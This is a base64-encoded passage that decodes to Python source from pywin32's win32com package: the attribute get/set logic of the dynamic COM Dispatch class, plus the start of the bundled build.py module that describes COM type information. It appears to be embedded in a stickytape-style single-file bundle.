YWwgbWV0aG9kXG4gICAgICAgICMgbXVzdCBub3QgeWV0IGV4aXN0LCAob3RoZXJ3aXNlIHdlIHdvdWxkIG5vdCBiZSBoZXJlKS4gIFRoaXNcbiAgICAgICAgIyBtZWFucyB3ZSBjcmVhdGUgdGhlIGFjdHVhbCBtZXRob2Qgb2JqZWN0IC0gd2hpY2ggYWxzbyBtZWFuc1xuICAgICAgICAjIHRoaXMgY29kZSB3aWxsIG5ldmVyIGJlIGFza2VkIGZvciB0aGF0IG1ldGhvZCBuYW1lIGFnYWluLlxuICAgICAgICBpZiBhdHRyIGluIHNlbGYuX29sZXJlcHJfLm1hcEZ1bmNzOlxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX21ha2VfbWV0aG9kXyhhdHRyKVxuXG4gICAgICAgICMgRGVsZWdhdGUgdG8gcHJvcGVydHkgbWFwcy9jYWNoZWQgaXRlbXNcbiAgICAgICAgcmV0RW50cnkgPSBOb25lXG4gICAgICAgIGlmIHNlbGYuX29sZXJlcHJfIGFuZCBzZWxmLl9vbGVvYmpfOlxuICAgICAgICAgICAgIyBmaXJzdCBjaGVjayBnZW5lcmFsIHByb3BlcnR5IG1hcCwgdGhlbiBzcGVjaWZpYyAicHV0IiBtYXAuXG4gICAgICAgICAgICByZXRFbnRyeSA9IHNlbGYuX29sZXJlcHJfLnByb3BNYXAuZ2V0KGF0dHIpXG4gICAgICAgICAgICBpZiByZXRFbnRyeSBpcyBOb25lOlxuICAgICAgICAgICAgICAgIHJldEVudHJ5ID0gc2VsZi5fb2xlcmVwcl8ucHJvcE1hcEdldC5nZXQoYXR0cilcbiAgICAgICAgICAgICMgTm90IGZvdW5kIHNvIGZhciAtIFNlZSB3aGF0IENPTSBzYXlzLlxuICAgICAgICAgICAgaWYgcmV0RW50cnkgaXMgTm9uZTpcbiAgICAgICAgICAgICAgICB0cnk6XG4gICAgICAgICAgICAgICAgICAgIGlmIHNlbGYuX19MYXp5TWFwX18oYXR0cik6XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiBhdHRyIGluIHNlbGYuX29sZXJlcHJfLm1hcEZ1bmNzOlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBzZWxmLl9tYWtlX21ldGhvZF8oYXR0cilcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldEVudHJ5ID0gc2VsZi5fb2xlcmVwcl8ucHJvcE1hcC5nZXQoYXR0cilcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHJldEVudHJ5IGlzIE5vbmU6XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0RW50cnkgPSBzZWxmLl9vbGVyZXByXy5wcm9wTWFwR2V0LmdldChhdHRyKVxuICAgICAgICAgICAgICAgICAgICBpZiByZXRFbnRyeSBpcyBOb25lOlxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0RW50cnkgPSBidWlsZC5NYXBFbnRyeShzZWxmLl9fQXR0clRvSURfXyhhdHRyKSwgKGF0dHIsKSlcbiAgICAgICAgICAgICAgICBleGNlcHQgcHl0aG9uY29tLm9sZV9lcnJvcjpcbiAgICAgICAgICAgICAgICAgICAgcGFzcyAgIyBObyBwcm9wIGJ5IHRoYXQgbmFtZSAtIHJldEVudHJ5IHJlbWFpbnMgTm9uZS5cblxuICAgICAgICBpZiByZXRFbnRyeSBpcyBub3QgTm9uZTogICMgc2VlIGlmIGluIG15IGNhY2hlXG4gICAgICAgICAgICB0cnk6XG4gICAgICAgICAgICAgICAgcmV0ID0gc2VsZi5fbWFwQ2FjaGVkSXRlbXNfW3JldEVudHJ5LmRpc3BpZF1cbiAgICAgICAgICAgICAgICBkZWJ1Z19hdHRyX3ByaW50KCJDYWNoZWQgaXRlbXMgaGFzIGF0dHJpYnV0ZSEiLCByZXQpXG4gICAgICAgICAgICAgICAgcmV0dXJuIHJldFxuICAgICAgICAgICAgZXhjZXB0IChLZXlFcnJvciwgQXR0cmlidXRlRXJyb3IpOlxuICAgICAgICAgICAgICAgIGRlYnVnX2F0dHJfcHJpbnQoIkF0dHJpYnV0ZSAlcyBub3QgaW4gY2FjaGUiICUgYXR0cilcblxuICAgICAgICAjIElmIHdlIGFyZSBzdGlsbCBoZXJlLCBhbmQgaGF2ZSBhIHJldEVudHJ5LCBnZXQgdGhlIE9MRSBpdGVtXG4gICAgICAgIGlmIHJldEVudHJ5IGlzIG5vdCBOb25lOlxuICAgICAgICAgICAgaW52b2tlX3R5cGUgPSBfR2V0RGVzY0ludm9rZVR5cGUocmV0RW50cnksIHB5dGhvbmNvbS5JTlZPS0VfUFJPUEVSVFlHRVQpXG4gICAgICAgICAgICBkZWJ1Z19hdHRyX3ByaW50KFxuICAgICAgICAgICAgICAgICJHZXR0aW5nIHByb3BlcnR5IElkIDB4JXggZnJvbSBPTEUgb2JqZWN0IiAlIHJldEVudHJ5LmRpc3BpZFxuICAgICAgICAgICAgKVxuICAgICAgICAgICAgdHJ5OlxuICAgICAgICAgICAgICAgIHJldCA9IHNlbGYuX29sZW9ial8uSW52b2tlKHJldEVudHJ5LmRpc3BpZCwgMCwgaW52b2tlX3R5cGUsIDEpXG4gICAgICAgICAgICBleGNlcHQgcHl0aG9uY29tLmNvbV9lcnJvciBhcyBkZXRhaWxzOlxuICAgICAgICAgICAgICAgIGlmIGRldGFpbHMuaHJlc3VsdCBpbiBFUlJPUlNfQkFEX0NPTlRFWFQ6XG4gICAgICAgICAgICAgICAgICAgICMgTWF5IGJlIGEgbWV0aG9kLlxuICAgICAgICAgICAgICAgICAgICBzZWxmLl9vbGVyZXByXy5tYXBGdW5jc1thdHRyXSA9IHJldEVudHJ5XG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBzZWxmLl9tYWtlX21ldGhvZF8oYXR0cilcbiAgICAgICAgICAgICAgICByYWlzZVxuICAgICAgICAgICAgZGVidWdfYXR0cl9wcmludCgiT0xFIHJldHVybmVkICIsIHJldClcbiAgICAgICAgICAgIHJldHVybiBzZWxmLl9nZXRfZ29vZF9vYmplY3RfKHJldClcblxuICAgICAgICAjIG5vIHdoZXJlIGVsc2UgdG8gbG9vay5cbiAgICAgICAgcmFpc2UgQXR0cmlidXRlRXJyb3IoIiVzLiVzIiAlIChzZWxmLl91c2VybmFtZV8sIGF0dHIpKVxuXG4gICAgZGVmIF9fc2V0YXR0cl9fKHNlbGYsIGF0dHIsIHZhbHVlKTpcbiAgICAgICAgaWYgKFxuICAgICAgICAgICAgYXR0ciBpbiBzZWxmLl9fZGljdF9fXG4gICAgICAgICk6ICAjIEZhc3QtdHJhY2sgLSBpZiBhbHJlYWR5IGluIG91ciBkaWN0LCBqdXN0IG1ha2UgdGhlIGFzc2lnbm1lbnQuXG4gICAgICAgICAgICAjIFhYWCAtIHNob3VsZCBtYXliZSBjaGVjayBtZXRob2QgbWFwIC0gaWYgc29tZW9uZSBhc3NpZ25zIHRvIGEgbWV0aG9kLFxuICAgICAgICAgICAgIyBpdCBjb3VsZCBtZWFuIHNvbWV0aGluZyBzcGVjaWFsIChub3Qgc3VyZSB3aGF0LCB0aG8hKVxuICAgICAgICAgICAgc2VsZi5fX2RpY3RfX1thdHRyXSA9IHZhbHVlXG4gICAgICAgICAgICByZXR1cm5cbiAgICAgICAgIyBBbGxvdyBwcm9wZXJ0eSBhc3NpZ25tZW50LlxuICAgICAgICBkZWJ1Z19hdHRyX3ByaW50KFxuICAgICAgICAgICAgIlNldEF0dHIgY2FsbGVkIGZvciAlcy4lcz0lcyBvbiBEaXNwYXRjaENvbnRhaW5lciJcbiAgICAgICAgICAgICUgKHNlbGYuX3VzZXJuYW1lXywgYXR0ciwgcmVwcih2YWx1ZSkpXG4gICAgICAgIClcblxuICAgICAgICBpZiBzZWxmLl9vbGVyZXByXzpcbiAgICAgICAgICAgICMgQ2hlY2sgdGhlICJnZW5lcmFsIiBwcm9wZXJ0eSBtYXAuXG4gICAgICAgICAgICBpZiBhdHRyIGluIHNlbGYuX29sZXJlcHJfLnByb3BNYXA6XG4gICAgICAgICAgICAgICAgZW50cnkgPSBzZWxmLl9vbGVyZXByXy5wcm9wTWFwW2F0dHJdXG4gICAgICAgICAgICAgICAgaW52b2tlX3R5cGUgPSBfR2V0RGVzY0ludm9rZVR5cGUoZW50cnksIHB5dGhvbmNvbS5JTlZPS0VfUFJPUEVSVFlQVVQpXG4gICAgICAgICAgICAgICAgc2VsZi5fb2xlb2JqXy5JbnZva2UoZW50cnkuZGlzcGlkLCAwLCBpbnZva2VfdHlwZSwgMCwgdmFsdWUpXG4gICAgICAgICAgICAgICAgcmV0dXJuXG4gICAgICAgICAgICAjIENoZWNrIHRoZSBzcGVjaWZpYyAicHV0IiBtYXAuXG4gICAgICAgICAgICBpZiBhdHRyIGluIHNlbGYuX29sZXJlcHJfLnByb3BNYXBQdXQ6XG4gICAgICAgICAgICAgICAgZW50cnkgPSBzZWxmLl9vbGVyZXByXy5wcm9wTWFwUHV0W2F0dHJdXG4gICAgICAgICAgICAgICAgaW52b2tlX3R5cGUgPSBfR2V0RGVzY0ludm9rZVR5cGUoZW50cnksIHB5dGhvbmNvbS5JTlZPS0VfUFJPUEVSVFlQVVQpXG4gICAgICAgICAgICAgICAgc2VsZi5fb2xlb2JqXy5JbnZva2UoZW50cnkuZGlzcGlkLCAwLCBpbnZva2VfdHlwZSwgMCwgdmFsdWUpXG4gICAgICAgICAgICAgICAgcmV0dXJuXG5cbiAgICAgICAgIyBUcnkgdGhlIE9MRSBPYmplY3RcbiAgICAgICAgaWYgc2VsZi5fb2xlb2JqXzpcbiAgICAgICAgICAgIGlmIHNlbGYuX19MYXp5TWFwX18oYXR0cik6XG4gICAgICAgICAgICAgICAgIyBDaGVjayB0aGUgImdlbmVyYWwiIHByb3BlcnR5IG1hcC5cbiAgICAgICAgICAgICAgICBpZiBhdHRyIGluIHNlbGYuX29sZXJlcHJfLnByb3BNYXA6XG4gICAgICAgICAgICAgICAgICAgIGVudHJ5ID0gc2VsZi5fb2xlcmVwcl8ucHJvcE1hcFthdHRyXVxuICAgICAgICAgICAgICAgICAgICBpbnZva2VfdHlwZSA9IF9HZXREZXNjSW52b2tlVHlwZShcbiAgICAgICAgICAgICAgICAgICAgICAgIGVudHJ5LCBweXRob25jb20uSU5WT0tFX1BST1BFUlRZUFVUXG4gICAgICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fb2xlb2JqXy5JbnZva2UoZW50cnkuZGlzcGlkLCAwLCBpbnZva2VfdHlwZSwgMCwgdmFsdWUpXG4gICAgICAgICAgICAgICAgICAgIHJldHVyblxuICAgICAgICAgICAgICAgICMgQ2hlY2sgdGhlIHNwZWNpZmljICJwdXQiIG1hcC5cbiAgICAgICAgICAgICAgICBpZiBhdHRyIGluIHNlbGYuX29sZXJlcHJfLnByb3BNYXBQdXQ6XG4gICAgICAgICAgICAgICAgICAgIGVudHJ5ID0gc2VsZi5fb2xlcmVwcl8ucHJvcE1hcFB1dFthdHRyXVxuICAgICAgICAgICAgICAgICAgICBpbnZva2VfdHlwZSA9IF9HZXREZXNjSW52b2tlVHlwZShcbiAgICAgICAgICAgICAgICAgICAgICAgIGVudHJ5LCBweXRob25jb20uSU5WT0tFX1BST1BFUlRZUFVUXG4gICAgICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fb2xlb2JqXy5JbnZva2UoZW50cnkuZGlzcGlkLCAwLCBpbnZva2VfdHlwZSwgMCwgdmFsdWUpXG4gICAgICAgICAgICAgICAgICAgIHJldHVyblxuICAgICAgICAgICAgdHJ5OlxuICAgICAgICAgICAgICAgIGVudHJ5ID0gYnVpbGQuTWFwRW50cnkoc2VsZi5fX0F0dHJUb0lEX18oYXR0ciksIChhdHRyLCkpXG4gICAgICAgICAgICBleGNlcHQgcHl0aG9uY29tLmNvbV9lcnJvcjpcbiAgICAgICAgICAgICAgICAjIE5vIGF0dHJpYnV0ZSBvZiB0aGF0IG5hbWVcbiAgICAgICAgICAgICAgICBlbnRyeSA9IE5vbmVcbiAgICAgICAgICAgIGlmIGVudHJ5IGlzIG5vdCBOb25lOlxuICAgICAgICAgICAgICAgIHRyeTpcbiAgICAgICAgICAgICAgICAgICAgaW52b2tlX3R5cGUgPSBfR2V0RGVzY0ludm9rZVR5cGUoXG4gICAgICAgICAgICAgICAgICAgICAgICBlbnRyeSwgcHl0aG9uY29tLklOVk9LRV9QUk9QRVJUWVBVVFxuICAgICAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX29sZW9ial8uSW52b2tlKGVudHJ5LmRpc3BpZCwgMCwgaW52b2tlX3R5cGUsIDAsIHZhbHVlKVxuICAgICAgICAgICAgICAgICAgICBzZWxmLl9vbGVyZXByXy5wcm9wTWFwW2F0dHJdID0gZW50cnlcbiAgICAgICAgICAgICAgICAgICAgZGVidWdfYXR0cl9wcmludChcbiAgICAgICAgICAgICAgICAgICAgICAgICJfX3NldGF0dHJfXyBwcm9wZXJ0eSAlcyAoaWQ9MHgleCkgaW4gRGlzcGF0Y2ggY29udGFpbmVyICVzIlxuICAgICAgICAgICAgICAgICAgICAgICAgJSAoYXR0ciwgZW50cnkuZGlzcGlkLCBzZWxmLl91c2VybmFtZV8pXG4gICAgICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuXG4gICAgICAgICAgICAgICAgZXhjZXB0IHB5dGhvbmNvbS5jb21fZXJyb3I6XG4gICAgICAgICAgICAgICAgICAgIHBhc3NcbiAgICAgICAgcmFpc2UgQXR0cmlidXRlRXJyb3IoXG4gICAgICAgICAgICAiUHJvcGVydHkgXCclcy4lc1wnIGNhbiBub3QgYmUgc2V0LiIgJSAoc2VsZi5fdXNlcm5hbWVfLCBhdHRyKVxuICAgICAgICApXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnd2luMzJjb20vY2xpZW50L2J1aWxkLnB5JywgYiciIiJDb250YWlucyBrbm93bGVkZ2UgdG8gYnVpbGQgYSBDT00gb2JqZWN0IGRlZmluaXRpb24uXG5cblRoaXMgbW9kdWxlIGlzIHVzZWQgYnkgYm90aCB0aGUgQGR5bmFtaWNAIGFuZCBAbWFrZXB5QCBtb2R1bGVzIHRvIGJ1aWxkXG5hbGwga25vd2xlZGdlIG9mIGEgQ09NIG9iamVjdC5cblxuVGhpcyBtb2R1bGUgY29udGFpbnMgY2xhc3NlcyB3aGljaCBjb250YWluIHRoZSBhY3R1YWwga25vd2xlZGdlIG9mIHRoZSBvYmplY3QuXG5UaGlzIGluY2x1ZGUgcGFyYW1ldGVyIGFuZCByZXR1cm4gdHlwZSBpbmZvcm1hdGlvbiwgdGhlIENPTSBkaXNwaWQgYW5kIENMU0lELCBldGMuXG5cbk90aGVyIG1vZHVsZXMgbWF5IHVzZSB0aGlzIGluZm9ybWF0aW9uIHRvIGdlbmVyYXRlIC5weSBmaWxlcywgdXNlIHRoZSBpbmZvcm1hdGlvblxuZHluYW1pY2FsbHksIG9yIHBvc3NpYmx5IGV2ZW4gZ2VuZXJhdGUgLmh0bWwgZG9jdW1lbnRhdGlvbiBmb3Igb2JqZWN0cy5cbiIiIlxuXG4jXG4jIE5PVEVTOiBEaXNwYXRjaEl0ZW0gYW5kIE1hcEVudHJ5IHVzZWQgYnkgZHluYW1pYy5weS5cbiMgICAgICAgIHRoZSByZXN0IGlzIHVzZWQgYnkgbWFrZXB5LnB5XG4jXG4jICAgICAgICBPbGVJdGVtLCBEaXNwYXRjaEl0ZW0sIE1hcEVudHJ5LCBCdWlsZENhbGxMaXN0KCkgaXMgdXNlZCBieSBtYWtlcHlcblxuaW1wb3J0IHN5c1xuaW1wb3J0IHN0cmluZ1xuZnJvbSBrZXl3b3JkIGltcG9ydCBpc2tleXdvcmRcblxuaW1wb3J0IHB5dGhvbmNvbVxuZnJvbSBweXdpbnR5cGVzIGltcG9ydCBUaW1lVHlwZVxuaW1wb3J0IHdpbmVycm9yXG5pbXBvcnQgZGF0ZXRpbWVcblxuIyBJdCBpc25cJ3QgcmVhbGx5IGNsZWFyIHdoYXQgdGhlIHF1b3RpbmcgcnVsZXMgYXJlIGluIGEgQy9JREwgc3RyaW5nIGFuZFxuIyBsaXRlcmFscyBsaWtlIGEgcXVvdGUgY2hhciBhbmQgYmFja3NsYXNoZXMgbWFrZXMgbGlmZSBhIGxpdHRsZSBwYWluZnVsIHRvXG4jIGFsd2F5cyByZW5kZXIgdGhlIHN0cmluZyBwZXJmZWN0bHkgLSBzbyBqdXN0IHB1bnQgYW5kIGZhbGwtYmFjayB0byBhIHJlcHIoKVxuZGVmIF9tYWtlRG9jU3RyaW5nKHMpOlxuICAgIGlmIHN5cy52ZXJzaW9uX2luZm8gPCAoMywpOlxuICAgICAgICBzID0gcy5lbmNvZGUoIm1iY3MiKVxuICAgIHJldHVybiByZXByKHMpXG5cblxuZXJyb3IgPSAiUHl0aG9uQ09NLkNsaWVudC5CdWlsZCBlcnJvciJcblxuXG5jbGFzcyBOb3RTdXBwb3J0ZWRFeGNlcHRpb24oRXhjZXB0aW9uKTpcbiAgICBwYXNzICAjIFJhaXNlZCB3aGVuIHdlIGNhbnQgc3VwcG9ydCBhIHBhcmFtIHR5cGUuXG5cblxuRHJvcEluZGlyZWN0aW9uID0gIkRyb3BJbmRpcmVjdGlvbiJcblxuTm9UcmFuc2xhdGVUeXBlcyA9IFtcbiAgICBweXRob25jb20uVlRfQk9PTCxcbiAgICBweXRob25jb20uVlRfQ0xTSUQsXG4gICAgcHl0aG9uY29tLlZUX0NZLFxuICAgIHB5dGhvbmNvbS5WVF9EQVRFLFxuICAgIHB5dGhvbmNvbS5WVF9ERUNJTUFMLFxuICAgIHB5dGhvbmNvbS5WVF9FTVBUWSxcbiAgICBweXRob25jb20uVlRfRVJST1IsXG4gICAgcHl0aG9uY29tLlZUX0ZJTEVUSU1FLFxuICAgIHB5dGhvbmNvbS5WVF9IUkVTVUxULFxuICAgIHB5dGhvbmNvbS5WVF9JMSxcbiAgICBweXRob25jb20uVlRfSTIsXG4gICAgcHl0aG9uY29tLlZUX0k0LFxuICAgIHB5dGhvbmNvbS5WVF9JOCxcbiAgICBweXRob25jb20uVlRfSU5ULFxuICAgIHB5dGhvbmNvbS5WVF9OVUxMLFxuICAgIHB5dGhvbmNvbS5WVF9SNCxcbiAgICBweXRob25jb20uVlRfUjgsXG4gICAgcHl0aG9uY29tLlZUX05VTEwsXG4gICAgcHl0aG9uY29tLlZUX1NUUkVBTSxcbiAgICBweXRob25jb20uVlRfVUkxLFxuICAgIHB5dGhvbmNvbS5WVF9VSTIsXG4gICAgcHl0aG9uY29tLlZUX1VJNCxcbiAgICBweXRob25jb20uVlRfVUk4LFxuICAgIHB5dGhvbmNvbS5WVF9VSU5ULFxuICAgIHB5dGhvbmNvbS5WVF9WT0lELFxuXVxuXG5Ob1RyYW5zbGF0ZU1hcCA9IHt9XG5mb3IgdiBpbiBOb1RyYW5zbGF0ZVR5cGVzOlxuICAgIE5vVHJhbnNsYXRlTWFwW3ZdID0gTm9uZVxuXG5cbmNsYXNzIE1hcEVudHJ5OlxuICAgICJTaW1wbGUgaG9sZGVyIGZvciBuYW1lZCBhdHRpYnV0ZXMgLSBpdGVtcyBpbiBhIG1hcC4iXG5cbiAgICBkZWYgX19pbml0X18oXG4gICAgICAgIHNlbGYsXG4gICAgICAgIGRlc2Nfb3JfaWQsXG4gICAgICAgIG5hbWVzPU5vbmUsXG4gICAgICAgIGRvYz1Ob25lLFxuICAgICAgICByZXN1bHRDTFNJRD1weXRob25jb20uSUlEX05VTEwsXG4gICAgICAgIHJlc3VsdERvYz1Ob25lLFxuICAgICAgICBoaWRkZW49MCxcbiAgICApOlxuICAgICAgICBpZiB0eXBlKGRlc2Nfb3JfaWQpID09IHR5cGUoMCk6XG4gICAgICAgICAgICBzZWxmLmRpc3BpZCA9IGRlc2Nfb3JfaWRcbiAgICAgICAgICAgIHNlbGYuZGVzYyA9IE5vbmVcbiAgICAgICAgZWxzZTpcbiAgICAgICAgICAgIHNlbGYuZGlzcGlkID0gZGVzY19vcl9pZFswXVxuICAgICAgICAgICAgc2VsZi5kZXNjID0gZGVzY19vcl9pZFxuXG4gICAgICAgIHNlbGYubmFtZXMgPSBuYW1lc1xuICAgICAgICBzZWxmLmRvYyA9IGRvY1xuICAgICAgICBzZWxmLnJlc3VsdENMU0lEID0gcmVzdWx0Q0xTSURcbiAgICAgICAgc2VsZi5yZXN1bHREb2N1bWVudGF0aW9uID0gcmVzdWx0RG9jXG4gICAgICAgIHNlbGYud2FzUHJvcGVydHkgPSAoXG4gICAgICAgICAgICAwICAjIEhhdmUgSSBiZWVuIHRyYW5zZm9ybWVkIGludG8gYSBmdW5jdGlvbiBzbyBJIGNhbiBwYXNzIGFyZ3M/XG4gICAgICAgIClcbiAgICAgICAgc2VsZi5oaWRkZW4gPSBoaWRkZW5cblxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKTpcbiAgICAgICAgcmV0dXJuIChcbiAgICAgICAgICAgICJNYXBFbnRyeShkaXNwaWQ9e3MuZGlzcGlkfSwgZGVzYz17cy5kZXNjfSwgbmFtZXM9e3MubmFtZXN9LCBkb2M9e3MuZG9jIXJ9LCAiXG4gICAgICAgICAgICAicmVzdWx0Q0xTSUQ9e3MucmVzdWx0Q0xTSUR9LCByZXN1bHREb2N1bWVudGF0aW9uPXtzLnJlc3VsdERvY3VtZW50YXRpb259LCAiXG4gICAgICAgICAgICAid2FzUHJvcGVydHk9e3Mud2FzUHJvcGVydHl9LCBoaWRkZW49e3MuaGlkZGVufSJcbiAgICAgICAgKS5mb3JtYXQocz1zZWxmKVxuXG4gICAgZGVmIEdldFJlc3VsdENMU0lEKHNlbGYpOlxuICAgICAgICByYyA9IHNlbGYucmVzdWx0Q0xTSURcbiAgICAgICAgaWYgcmMgPT0gcHl0aG9uY29tLklJRF9OVUxMOlxuICAgICAgICAgICAgcmV0dXJuIE5vbmVcbiAgICAgICAgcmV0dXJuIHJjXG5cbiAgICAjIFJldHVybiBhIHN0cmluZywgc3VpdGFibGUgZm9yIG91dHB1dCAtIGVpdGhlciAiXCd7Li4ufVwnIiBvciAiTm9uZSJcbiAgICBkZWYgR2V0UmVzdWx0Q0xTSURTdHIoc2VsZik6XG4gICAgICAgIHJjID0gc2VsZi5HZXRSZXN1bHRDTFNJRCgpXG4gICAgICAgIGlmIHJjIGlzIE5vbmU6XG4gICAgICAgICAgICByZXR1cm4gIk5vbmUiXG4gICAgICAgIHJldHVybiByZXByKFxuICAgICAgICAgICAgc3RyKHJjKVxuICAgICAgICApICAjIENvbnZlcnQgdGhlIElJRCBvYmplY3QgdG8gYSBzdHJpbmcsIHRoZW4gdG8gYSBzdHJpbmcgaW4gYSBzdHJpbmcuXG5cbiAgICBkZWYgR2V0UmVzdWx0TmFtZShzZWxmKTpcbiAgICAgICAgaWYgc2VsZi5yZXN1bHREb2N1bWVudGF0aW9uIGlzIE5vbmU6XG4gICAgICAgICAgICByZXR1cm4gTm9uZVxuICAgICAgICByZXR1cm4gc2VsZi5yZXN1bHREb2N1bWVudGF0aW9uWzBdXG5cblxuY2xhc3MgT2xlSXRlbTpcbiAgICB0eXBlbmFtZSA9ICJPbGVJdGVtIlxuXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGRvYz1Ob25lKTpcbiAgICAgICAgc2VsZi5kb2MgPSBkb2NcbiAgICAgICAgaWYgc2VsZi5kb2M6XG4gICAgICAgICAgICBzZWxmLnB5dGhvbl9uYW1lID0gTWFrZVB1YmxpY0F0dHJpYnV0ZU5hbWUoc2VsZi5kb2NbMF0pXG4gICAgICAgIGVsc2U6XG4gICAgICAgICAgICBzZWxmLnB5dGhvbl9uYW1lID0gTm9uZVxuICAgICAgICBzZWxmLmJXcml0dGVuID0gMFxuICAgICAgICBzZWxmLmJJc0Rpc3BhdGNoID0gMFxuICAgICAgICBzZWxmLmJJc1NpbmsgPSAwXG4gICAgICAgIHNlbGYuY2xzaWQgPSBOb25lXG4gICAgICAgIHNlbGYuY29fY2xhc3MgPSBOb25lXG5cblxuY2xhc3MgRGlzcGF0Y2hJdGVtKE9sZUl0ZW0pOlxuICAgIHR5cGVuYW1lID0gIkRpc3BhdGNoSXRlbSJcblxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCB0eXBlaW5mbz1Ob25lLCBhdHRyPU5vbmUsIGRvYz1Ob25lLCBiRm9yVXNlcj0xKTpcbiAgICAgICAgT2xlSXRlbS5fX2luaXRfXyhzZWxmLCBkb2MpXG4gICAgICAgIHNlbGYucHJvcE1hcCA9IHt9XG4gICAgICAgIHNlbGYucHJvcE1hcEdldCA9IHt9XG4gICAgICAgIHNlbGYucHJvcE1hcFB1dCA9IHt9XG4gICAgICAgIHNlbGYubWFwRnVuY3MgPSB7fVxuICAgICAgICBzZWxmLmRlZmF1bHREaXNwYXRjaE5hbWUgPSBOb25lXG4gICAgICAgIHNlbGYuaGlkZGVuID0gMFxuXG4gICAgICAgIGlmIHR5cGVpbmZvOlxuICAgICAgICAgICAgc2VsZi5CdWlsZCh0eXBlaW5mbywgYXR0ciwgYkZvclVzZXIpXG5cbiAgICBkZWYgX3Byb3BNYXBQdXRDaGVja18oc2VsZiwga2V5LCBpdGVtKTpcbiAgICAgICAgaW5zLCBvdXRzLCBvcHRzID0gc2VsZi5Db3VudEluT3V0T3B0QXJncyhpdGVtLmRlc2NbMl0pXG4gICAgICAgIGlmIGlucyA+IDE6ICAjIGlmIGEgUHV0IHByb3BlcnR5IHRha2VzIG1vcmUgdGhhbiAxIGFyZzpcbiAgICAgICAgICAgIGlmIG9wdHMgKyAxID09IGlucyBvciBpbnMgPT0gaXRlbS5kZXNjWzZdICsgMTpcbiAgICAgICAgICAgICAgICBuZXdLZXkgPSAiU2V0IiArIGtleVxuICAgICAgICAgICAgICAgIGRlbGV0ZUV4aXN0aW5nID0gMCAgIyBUaGlzIG9uZSBpcyBzdGlsbCBPS1xuICAgICAgICAgICAgZWxzZTpcbiAgICAgICAgICAgICAgICBkZWxldGVFeGlzdGluZyA9IDEgICMgTm8gZ29vZCB0byB1c1xuICAgICAgICAgICAgICAgIGlmIGtleSBpbiBzZWxmLm1hcEZ1bmNzIG9yIGtleSBpbiBzZWxmLnByb3BNYXBHZXQ6XG4gICAgICAgICAgICAgICAgICAgIG5ld0tleSA9ICJTZXQiICsga2V5XG4gICAgICAgICAgICAgICAgZWxzZTpcbiAgICAgICAgICAgICAgICAgICAgbmV3S2V5ID0ga2V5XG4gICAgICAgICAgICBpdGVtLndhc1Byb3BlcnR5ID0gMVxuICAgICAgICAgICAgc2VsZi5tYXBGdW5jc1tuZXdLZXldID0gaXRlbVxuICAgICAgICAgICAgaWYgZGVsZXRlRXhpc3Rpbmc6XG4gICAgICAgICAgICAgICAgZGVsIHNlbGYucHJvcE1hcFB1dFtrZXldXG5cbiAgICBkZWYgX3Byb3BNYXBHZXRDaGVja18oc2VsZiwga2V5LCBpdGVtKTpcbiAgICAgICAgaW5zLCBvdXRzLCBvcHRzID0gc2VsZi5Db3VudEluT3V0T3B0QXJncyhpdGVtLmRlc2NbMl0pXG4gICAgICAgIGlmIGlucyA+IDA6ICAjIGlmIGEgR2V0IHByb3BlcnR5IHRha2VzIF9hbnlfIGluIGFyZ3M6XG4gICAgICAgICAgICBpZiBpdGVtLmRlc2NbNl0gPT0gaW5zIG9yIGlucyA9PSBvcHRzOlxuICAgICAgICAgICAgICAgIG5ld0tleSA9ICJHZXQiICsga2V5XG4gICAgICAgICAgICAgICAgZGVsZXRlRXhpc3RpbmcgPSAwICAjIFRoaXMgb25lIGlzIHN0aWxsIE9LXG4gICAgICAgICAgICBlbHNlOlxuICAgICAgICAgICAgICAgIGRlbGV0ZUV4aXN0aW5nID0gMSAgIyBObyBnb29kIHRvIHVzXG4gICAgICAgICAgICAgICAgaWYga2V5IGluIHNlbGYubWFwRnVuY3M6XG4gICAgICAgICAgICAgICAgICAgIG5ld0tleSA9ICJHZXQiICsga2V5XG4gICAgICAgICAgICAgICAgZWxzZTpcbiAgICAgICAgICAgICAgICAgICAgbmV3S2V5ID0ga2V5XG4gICAgICAgICAgICBpdGVtLndhc1Byb3BlcnR5ID0gMVxuICAgICAgICAgICAgc2VsZi5tYXBGdW5jc1tuZXdLZXldID0gaXRlbVxuICAgICAgICAgICAgaWYgZGVsZXRlRXhpc3Rpbmc6XG4gICAgICAgICAgICAgICAgZGVsIHNlbGYucHJvcE1hcEdldFtrZXldXG5cbiAgICBkZWYgX0FkZEZ1bmNfKHNlbGYsIHR5cGVpbmZvLCBmZGVzYywgYkZvclVzZXIpOlxuICAgICAgICBhc3NlcnQgZmRlc2MuZGVzY2tpbmQgPT0gcHl0aG9uY29tLkRFU0NLSU5EX0ZVTkNERVNDXG4gICAgICAgIGlkID0gZmRlc2MubWVtaWRcbiAgICAgICAgZnVuY2ZsYWdzID0gZmRlc2Mud0Z1bmNGbGFnc1xuICAgICAgICB0cnk6XG4gICAgICAgICAgICBuYW1lcyA9IHR5cGVpbmZvLkdldE5hbWVzKGlkKVxuICAgICAgICAgICAgbmFtZSA9IG5hbWVzWzBdXG4gICAgICAgIGV4Y2VwdCBweXRob25jb20ub2xlX2Vycm9yOlxuICAgICAgICAgICAgbmFtZSA9ICIiXG4gICAgICAgICAgICBuYW1lcyA9IE5vbmVcblxuICAgICAgICBkb2MgPSBOb25lXG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgIGlmIGJGb3JVc2VyOlxuICAgICAgICAgICAgICAgIGRvYyA9IHR5cGVpbmZvLkdldERvY3VtZW50YXRpb24oaWQpXG4gICAgICAgIGV4